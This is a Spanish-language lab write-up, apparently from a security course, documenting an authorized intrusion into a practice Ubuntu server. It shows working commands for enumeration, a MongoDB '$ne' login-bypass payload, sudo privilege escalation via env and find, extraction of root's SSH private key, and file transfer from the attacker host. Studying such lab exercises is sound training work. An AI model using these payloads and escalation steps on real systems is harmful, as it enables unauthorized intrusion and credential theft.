# Reporte Técnico Consolidado: Auditoría de Seguridad, Explotación y Post-Explotación en Laboratorio Virtual

**Autor / Operador:** Lozano  
**Rol:** Ingeniero DevSecOps / Auditor de Seguridad Ofensiva  
**Entorno de Laboratorio:** Red NAT `cetipracticas` (`192.168.1.0/24`)  
**Máquina Atacante:** Kali Linux GUI (`192.168.1.4`)  
**Máquina Objetivo:** Ubuntu Server 22.04 LTS (`192.168.1.101` / `cetilab.local`)  
**Fecha de Ejecución:** Octubre 2026  

---

## 1. Contexto Previo: Cadena de Intrusión Inicial (Prácticas 1 a 6)

El presente reporte documenta la fase avanzada de explotación, post-explotación, transferencia de artefactos y consolidación de persistencia realizada en el laboratorio `cetipracticas`. La intrusión previa sentó las bases para el acceso inicial al servidor `ubuntuServer` (`192.168.1.101`):

1. **Reconocimiento y Descubrimiento de Red (`nmap`)**:  
   El escaneo de red (`nmap -sn 192.168.1.0/24`) localizó la máquina objetivo en la dirección `192.168.1.101` con múltiples servicios expuestos (FTP 21, SSH 22, SMTP 25, DNS 53, HTTP 80, RPC/NFS 111/2049, SMB 139/445, SNMP 161, HTTP-Alt 8080).
2. **Transferencia de Zona DNS AXFR (`dig`)**:  
   Mediante la consulta `dig @192.168.1.101 cetilab.local -t axfr`, el servidor DNS expuso 11 subdominios internos críticos: `app.cetilab.local`, `db-mongo.cetilab.local`, `db-mysql.cetilab.local`, `files.cetilab.local`, `ftp.cetilab.local`, `mail.cetilab.local`, `nfs.cetilab.local`, `ns1.cetilab.local`, `snmp.cetilab.local`, `ssh.cetilab.local` y `www.cetilab.local`.
3. **Auditoría Web y Enumeración de Virtual Hosts (`gobuster` & Burp Suite)**:  
   El escaneo de VHOSTs con `gobuster` validó el alojamiento del portal interno en `app.cetilab.local`. La interceptación HTTP con Burp Suite identificó parámetros vulnerables a inyección SQL en la consulta de `/login` y `/archivos_ti`.
4. **Acceso a Recursos Compartidos SMB (`smbmap` / `cifs`)**:  
   Se utilizó `smbmap -H cetilab.local` para detectar el recurso `archivos_ti` accesible en modo solo lectura mediante una *null session*. El montaje en `/mnt/archivoCompartido` reveló dos archivos de texto: `nota_desarrollo.txt` (confirmando el servicio FTP) y `respaldo_credenciales.txt` con el hash MD5 de la contraseña del usuario `ftpuser`.
5. **Reconocimiento SNMP v2c (`snmpwalk`)**:  
   La enumeración SNMP con comunidad `public` (`snmpwalk -v 2c -c public cetilab.local`) expuso en el campo `sysLocation`:
   ```text
   NFS_EXPORT: /srv/nfs/respaldos_ti | TARGET_USER: developer
   ```
6. **Exfiltración de Llave SSH por NFS y Crackeo MD5 (`john`)**:  
   Se montó el recurso NFS en `/mnt/respaldos` (`mount -t nfs cetilab.local:/srv/nfs/respaldos_ti /mnt/respaldos`), localizando la llave privada `developer.key`. Tras asignarle permisos `chmod 600`, se utilizó para acceder como `developer` vía SSH. Paralelamente, con John the Ripper y la máscara `Ceti?d?d?d?d`, se crackeó el hash MD5 (`fcd065c1541dc1f64cce023e9f9e4900`), obteniendo la clave `Ceti2245`.

---

## 2. Práctica 1: Local Port Forwarding e Inyección NoSQL (NoSQLi)

### 2.1 Concepto y Justificación Técnica
Determinados servicios y paneles de administración internos (como instancias de bases de datos o paneles de microservicios) están configurados para escuchar exclusivamente en la interfaz de bucle invertido (`127.0.0.1`) de la máquina objetivo, impidiendo el acceso directo desde el segmento de red externo. 

Para acceder al servicio web interno que opera en el puerto `5000` de `ubuntuServer`, se estableció un túnel SSH con redirección de puerto local (*Local Port Forwarding*):

```bash
ssh -i /home/kali/developer.key -L 5000:127.0.0.1:5000 developer@192.168.1.101
```

Con este túnel, cualquier petición enviada a `http://127.0.0.1:5000` en la máquina atacante Kali Linux es cifrada y encapsulada por SSH hacia el servidor objetivo, que la entrega localmente al proceso en escucha.

### 2.2 Explotación de la Vulnerabilidad NoSQLi
Al acceder a `http://127.0.0.1:5000/`, se identificó una API que autentica usuarios contra una base de datos NoSQL (MongoDB) mediante solicitudes POST en formato JSON a la ruta `/login`.

Dado que las consultas en bases de datos orientadas a documentos evalúan objetos JSON como filtros directos, el envío de operadores lógicos de MongoDB permite eludir la validación si la aplicación no sanitiza los tipos de datos. Al inyectar el operador `$ne` (*not equal*) con valor `null`, la consulta verifica que el usuario y la contraseña simplemente existan y no sean nulos, resultando en una condición lógica siempre verdadera (`true`):

#### Petición HTTP Interceptada (Burp Suite / cURL):
```http
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json
Connection: close
Content-Length: 83

{
    "username": {
        "$ne": null
    },
    "password": {
        "$ne": null
    }
}
```

#### Respuesta del Servidor:
```http
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 98
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Mon, 05 Oct 2026 04:12:38 GMT

{
    "flag": "CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}",
    "message": "Autenticacion Correcta",
    "status": "success"
}
```

> **Bandera Obtenida:** `CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}`

![Evidencia 01: Petición y Respuesta NoSQLi con Flag](docs/assets/practica1_nosqli/01_nosqli_flag.png)

---

## 3. Práctica 2: Escalada Básica de Privilegios y Transferencia de Archivos

### 3.1 Enumeración de Privilegios Sudo (`sudo -l`)
Una vez dentro de la sesión de `developer`, se auditó la configuración de `sudoers` ejecutando `sudo -l`:

```text
Matching Defaults entries for developer on cetipracticas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User developer may run the following commands on cetipracticas:
    (ALL) NOPASSWD: /usr/bin/awk
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/env
```

### 3.2 Escalada Inmediata mediante `/usr/bin/env`
El binario `/usr/bin/env` ejecuta un comando en un entorno modificado. Al estar autorizado con privilegios de superusuario sin contraseña (`NOPASSWD`), permite invocar directamente un intérprete de comandos con UID 0:

```bash
developer@cetipracticas:~$ sudo env /bin/bash
root@cetipracticas:/home/developer# whoami
root
root@cetipracticas:/home/developer# id
uid=0(root) gid=0(root) groups=0(root)
```

### 3.3 Transferencia Bidireccional de Archivos
Para desplegar herramientas adicionales o exfiltrar información entre el anfitrión atacante y el servidor comprometido:
1. En Kali Linux (`192.168.1.4`), se levantó un servidor web liviano:
   ```bash
   python3 -m http.server 8000
   ```
2. Desde la máquina objetivo (`192.168.1.101`), se descargó el artefacto requerido mediante `curl`:
   ```bash
   curl http://192.168.1.4:8000/file.txt --output file.txt
   ```
3. Se comprobó la descarga exitosa en los registros del servidor HTTP y la creación del archivo de salida.

![Evidencia 02: Escalada con sudo env y Transferencia de Archivos](docs/assets/practica2_privesc_files/01_privesc_files.png)

---

## 4. Práctica 3: Persistencia, Gestión de Identidades y Criptografía SSH

### 4.1 Criptografía y Comparativa de Algoritmos (Ed25519 vs. RSA)
En la administración moderna de infraestructura y auditorías de seguridad, la elección del algoritmo de firma para llaves SSH es crítica:

| Criterio | RSA (3072/4096 bits) | Ed25519 (EdDSA sobre Curve25519) |
| :--- | :--- | :--- |
| **Longitud de Llave** | Extensa (3072 a 4096 bits) | Muy compacta (256 bits) |
| **Rendimiento** | Mayor consumo en generación y firma | Extremadamente rápida y constante |
| **Seguridad / Resistencia** | Susceptible a ataques de canal lateral si no se implementa con precisión | Diseñada específicamente contra ataques de tiempo y canal lateral |
| **Compatibilidad** | Universal (sistemas legados) | Estándar en OpenSSH >= 6.5 |

En la máquina atacante se generó un par de llaves Ed25519 para persistencia:
```bash
ssh-keygen -t ed25519 -f ~/.ssh/llave_p -N ""
```

En la máquina objetivo, como `root`, se generó un par de llaves RSA tradicional:
```bash
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
```

### 4.2 Despliegue de Llaves y Manejo de Errores de Permisos
1. Se intentó desplegar la llave pública mediante `ssh-copy-id`:
   ```bash
   ssh-copy-id -i ~/.ssh/llave_p.pub developer@192.168.1.101
   ```
   El intento fue rechazado debido a que la autenticación mediante contraseña se encontraba deshabilitada en la configuración del demonio `sshd` (`PasswordAuthentication no`).
2. Se extrajo la llave privada `id_rsa` generada en el servidor hacia la máquina atacante.
3. Al intentar conectar con permisos estándar de archivo (`0664`), el cliente OpenSSH abortó la conexión por motivos de seguridad:
   ```text
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   Permissions 0664 for 'id_rsa' are too open.
   It is required that your private key files are NOT accessible by others.
   This private key will be ignored.
   Load key "id_rsa": bad permissions
   ```
4. **Corrección de Permisos**:
   ```bash
   chmod 600 id_rsa
   ssh -i id_rsa root@192.168.1.101
   ```
   Tras ajustar los permisos a `0600` (lectura/escritura exclusiva para el propietario), el acceso SSH como superusuario `root` se consolidó exitosamente.

![Evidencia 03: Permisos SSH 0664 y Conexión con chmod 600](docs/assets/practica3_ssh_keys/01_ssh_permissions.png)

---

## 5. Práctica 4: Post-Explotación Avanzada con GTFOBins y Reto CTF Meow (Hack The Box)

### 5.1 Explotación de Binario `find` (GTFOBins)
El proyecto GTFOBins documenta cómo binarios estándar de Unix pueden ser utilizados para eludir restricciones de seguridad locales cuando están configurados con permisos SUID o privilegios `sudo NOPASSWD`.

El binario `/usr/bin/find` dispone del parámetro `-exec`, el cual ejecuta un comando externo por cada coincidencia encontrada. Al invocarse con privilegios de superusuario:

```bash
developer@cetipracticas:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
```

El parámetro `\; -quit` asegura que la shell se genere inmediatamente en el primer ciclo y termine la búsqueda tras salir de la sesión interactiva.

### 5.2 Compromiso Total y Extracción de Flag Final
Habiendo alcanzado la sesión de superusuario, se inspeccionó el directorio raíz `/root` localizando la bandera final del laboratorio:

```bash
root@cetipracticas:~# cat /root/root.txt
========================================================================
                 ¡FELICIDADES! HAS COMPROMETIDO EL SERVIDOR
========================================================================
FLAG FINAL: CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}

Has completado con éxito la ruta de intrusión completa:
DNS -> HTTP (SQLi) -> SAMBA -> FTP -> SNMP -> NFS -> SSH -> SMTP -> NoSQLi -> ROOT
========================================================================
```

> **Bandera Final Obtenida:** `CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}`

### 5.3 Resolución del Reto CTF en Hack The Box (Máquina Meow)
Como parte de la evaluación práctica de penetración en plataformas industriales de ciberseguridad, se completó la resolución de la máquina `Meow` en la plataforma **Hack The Box (HTB)** por el operador **Lozano**:

```text
You have solved Meow!
Congratulations Lozano best of luck in capturing flags ahead!
#629953 Machine Rank
14 Oct 2026 Pwn Date
Retired Machine State
150 XP Earned
Level Up! You reached level 2. Keep up the pace!
```

![Evidencia 04: Bandera root.txt de Compromiso Total](docs/assets/practica4_gtfobins_ctf/01_root_flag.png)

![Evidencia 05: Resolución de Máquina Meow en Hack The Box por Lozano](docs/assets/practica4_gtfobins_ctf/02_htb_meow.png)

---

## 6. Anexo de Automatización e Infraestructura del Laboratorio

### 6.1 Scripts de Ejecución Idempotente
El laboratorio cuenta con un conjunto de scripts diseñados para garantizar la repetibilidad y el principio de mínimo impacto (*Zero-Footprint*):
- `scripts/practicas/parcial1_practicas_01_a_06.sh`: Automatiza el reconocimiento DNS, enumeración de subdominios, montajes CIFS/NFS y crackeo de hashes con pausas interactivas.
- `scripts/kali-lab-state.sh`: Gestiona de manera idempotente los registros en `/etc/hosts`, montajes en `/mnt/`, permisos de llaves y túneles SSH.
- `auto_hack.sh.txt` y `auto_hack_parte2.sh`: Proveen la automatización guiada para pruebas de concepto en entornos de evaluación rápida.

### 6.2 Captura Directa de Framebuffer VirtualBox (`vm-snap.ps1`)
Para eliminar artefactos visuales del anfitrión, bordes de ventanas o fallos por pérdida de foco, las capturas de pantalla se obtienen directamente de la memoria gráfica de la máquina virtual mediante la API del hipervisor:

```powershell
.\scripts\vm-snap.ps1 -VmName "Kali-Linux-CLI" -OutputPath "docs/assets/practica1_nosqli/01_nosqli_flag.png"
```

### 6.3 Pipeline de Generación a DOCX y Sincronización con Google Docs
El flujo de entrega técnica está automatizado mediante Pandoc y el CLI oficial de Google Workspace (`@googleworkspace/cli`):
1. **Compilación**: Pandoc procesa el documento Markdown resolviendo las rutas de los activos visuales:
   ```powershell
   pandoc docs/reportes/REPORTE_PRACTICAS_LOZANO.md -o docs/reportes/Reporte_Final_Lozano.docx --resource-path=.:docs:docs/reportes:docs/assets
   ```
2. **Exportación a la Nube**: El script `scripts/build-report.ps1` detecta las credenciales activas y sube el archivo resultante a Google Drive especificando `mimeType: application/vnd.google-apps.document`. Esto genera un documento de Google Docs nativo, completamente editable, con estilos, tablas y capturas preservadas.
